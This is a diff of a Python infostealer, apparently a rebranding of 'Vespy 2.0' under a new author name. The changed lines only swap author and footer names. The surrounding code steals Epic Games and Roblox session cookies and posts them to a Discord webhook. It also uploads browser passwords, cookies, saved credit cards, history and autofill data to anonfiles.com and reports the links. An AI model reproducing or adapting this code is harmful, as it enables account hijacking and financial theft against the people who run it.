@@ -28,8 +28,8 @@ class CookieInfo():
         balance = r2['walletBalance']
         webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         embed = DiscordEmbed(title=f"EPIC Games Cookies", description=f"Grabbed Epic Games Account", color='4300d1')
-        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-        embed.set_footer(text='Vespy 2.0 | by : vesper')
+        embed.set_author(name="author : Beadidd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+        embed.set_footer(text='Beadidd 2.0 | by : Beadidd')
         embed.set_timestamp()
         embed.add_embed_field(name=f"Account of {displayname}\n", value=f":id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``")
         webhook.add_embed(embed)
@@ -40,8 +40,8 @@ class CookieInfo():
             r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
             webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
             embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
-            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-            embed.set_footer(text='Vespy 2.0 | by : vesper')
+            embed.set_author(name="author : Beadidd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+            embed.set_footer(text='Beadidd 2.0 | by : Beadidd')
             embed.set_timestamp()
             embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
             embed.set_thumbnail(url=r['ThumbnailUrl'])
@@ -217,10 +217,10 @@ class Browsers():
             HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"rb")}).json()['data']['file']['url']['full']
             DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"rb")}).json()['data']['file']['url']['full']
             AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"rb")}).json()['data']['file']['url']['full']
-            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+            webhook = DiscordWebhook(url=wbh, username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
             embed = DiscordEmbed(title=f"Browser Stealer", description=f"Found Information About Browsers", color='4300d1')
-            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-            embed.set_footer(text='Vespy 2.0 | by : vesper')
+            embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+            embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
             embed.set_timestamp()
             embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n")
             webhook.add_embed(embed)
